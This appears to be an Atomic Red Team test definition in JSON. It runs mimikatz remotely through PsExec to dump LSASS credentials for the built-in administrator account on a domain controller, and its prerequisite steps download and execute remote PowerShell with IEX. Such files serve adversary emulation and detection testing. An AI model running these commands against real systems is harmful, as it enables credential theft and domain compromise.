{
    "name": "Remote Process Injection in LSASS via mimikatz",
    "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread). Especially useful against domain controllers in Active Directory environments. It must be executed in the context of a user who is privileged on remote `machine`.  The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html> ",
    "supported_platforms": [
        "windows"
    ],
    "dependency_executor_name": "powershell",
    "executor": {
        "command": "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\"\n",
        "name": "command_prompt",
        "elevation_required": false,
        "type": "Command Executor"
    },
    "id": "T1055",
    "tactics": [
        "Privilege Escalation",
        "Defense Evasion"
    ],
    "technique": "Process Injection",
    "source": "ART",
    "uuid": "3203ad24-168e-4bec-be36-f79b13ef8a83",
    "arguments": {
        "machine": {
            "description": "machine to target (via psexec)",
            "type": "string",
            "default": "DC1"
        },
        "mimikatz_path": {
            "description": "Mimikatz windows executable",
            "type": "path",
            "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
        },
        "psexec_path": {
            "description": "Path to PsExec",
            "type": "string",
            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe"
        }
    },
    "preconditions": [
        {
            "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
            "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
            "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        },
        {
            "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
            "prereq_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
            "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" -UseBasicParsing\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim"
}